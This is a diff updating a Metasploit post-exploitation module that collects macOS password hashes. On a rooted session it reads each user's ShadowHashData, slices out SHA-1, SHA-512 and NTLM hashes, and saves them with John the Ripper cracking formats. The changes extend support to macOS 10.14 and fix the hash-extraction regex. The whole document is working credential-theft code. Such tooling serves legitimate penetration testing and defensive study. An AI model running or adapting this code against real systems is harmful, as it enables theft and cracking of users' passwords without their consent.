@@ -1,18 +1,18 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
 require 'msf/core/auxiliary/report'
 require 'rexml/document'
 
 class MetasploitModule < Msf::Post
   # set of accounts to ignore while pilfering data
-  OSX_IGNORE_ACCOUNTS = ["Shared", ".localized"]
+  #OSX_IGNORE_ACCOUNTS = ["Shared", ".localized"]
 
   include Msf::Post::File
+  include Msf::Post::OSX::Priv
+  include Msf::Post::OSX::System
   include Msf::Auxiliary::Report
 
   def initialize(info={})
@@ -20,7 +20,7 @@ class MetasploitModule < Msf::Post
         'Name'          => 'OS X Gather Mac OS X Password Hash Collector',
         'Description'   => %q{
             This module dumps SHA-1, LM, NT, and SHA-512 Hashes on OSX. Supports
-            versions 10.3 to 10.9.
+            versions 10.3 to 10.14.
         },
         'License'       => MSF_LICENSE,
         'Author'        => [
@@ -40,10 +40,13 @@ class MetasploitModule < Msf::Post
 
   # Run Method for when run command is issued
   def run
-    fail_with(Failure::BadConfig, "Insufficient Privileges: must be running as root to dump the hashes") unless root?
+    unless is_root?
+      fail_with(Failure::BadConfig, 'Insufficient Privileges: must be running as root to dump the hashes')
+    end
 
     # iterate over all users
-    users.each do |user|
+    get_nonsystem_accounts.each do |user_info|
+      user = user_info['name']
       next if datastore['MATCHUSER'].present? and datastore['MATCHUSER'] !~ user
       print_status "Attempting to grab shadow for user #{user}..."
       if gt_lion? # 10.8+
@@ -84,7 +87,11 @@ class MetasploitModule < Msf::Post
         end
 
         # slice out the sha512 hash + salt
-        sha512 = hash_decoded.scan(/^\w*4f1044(\w*)(080b190|080d101e31)/)[0][0]
+        # original regex left for historical purposes.  During testing it was discovered that
+        # 4f110200 was also a valid end.  Instead of looking for the end, since its a hash (known
+        # length) we can just set the length
+        #sha512 = hash_decoded.scan(/^\w*4f1044(\w*)(080b190|080d101e31)/)[0][0]
+        sha512 = hash_decoded.scan(/^\w*4f1044(\w{136})/)[0][0]
         report_hash("SHA-512", sha512, user)
       else # 10.6 and below
         # On 10.6 and below, SHA-1 is used for encryption
@@ -167,19 +174,31 @@ class MetasploitModule < Msf::Post
   # reports the hash info to metasploit backend
   def report_hash(type, hash, user)
     return unless hash.present?
-    print_status("#{type}:#{user}:#{hash}")
+    print_good("#{type}:#{user}:#{hash}")
     case type
     when "NT"
       private_data = "#{Metasploit::Credential::NTLMHash::BLANK_LM_HASH}:#{hash}"
       private_type = :ntlm_hash
+      jtr_format = 'ntlm'
     when "LM"
       private_data = "#{hash}:#{Metasploit::Credential::NTLMHash::BLANK_NT_HASH}"
       private_type = :ntlm_hash
-    when "SHA-512 PBKDF2", "SHA-512", "SHA-1"
+      jtr_format = 'lm'
+    when "SHA-512 PBKDF2"
       private_data = hash
       private_type = :nonreplayable_hash
+      jtr_format = 'PBKDF2-HMAC-SHA512'
+    when "SHA-512"
+      private_data = hash
+      private_type = :nonreplayable_hash
+      jtr_format = 'xsha512'
+    when "SHA-1"
+      private_data = hash
+      private_type = :nonreplayable_hash
+      jtr_format = 'xsha'
     end
     create_credential(
+      jtr_format: jtr_format,
       workspace_id: myworkspace_id,
       origin_type: :session,
       session_id: session_db_id,
@@ -191,12 +210,6 @@ class MetasploitModule < Msf::Post
     print_status("Credential saved in database.")
   end
 
-  # Checks if running as root on the target
-  # @return [Bool] current user is root
-  def root?
-    whoami == 'root'
-  end
-
   # @return [String] containing blob for ShadowHashData in user's plist
   # @return [nil] if shadow is invalid
   def grab_shadow_blob(user)
@@ -206,18 +219,8 @@ class MetasploitModule < Msf::Post
     shadow_bytes.sub!(/^dsAttrTypeNative:ShadowHashData:/, '')
   end
 
-  # @return [Array<String>] list of user names
-  def users
-    @users ||= cmd_exec("/bin/ls /Users").each_line.collect.map(&:chomp) - OSX_IGNORE_ACCOUNTS
-  end
-
   # @return [String] version string (e.g. 10.8.5)
   def ver_num
-    @version ||= cmd_exec("/usr/bin/sw_vers -productVersion").chomp
-  end
-
-  # @return [String] name of current user
-  def whoami
-    @whoami ||= cmd_exec('/usr/bin/whoami').chomp
+    @product_version ||= get_sysinfo['ProductVersion']
   end
 end
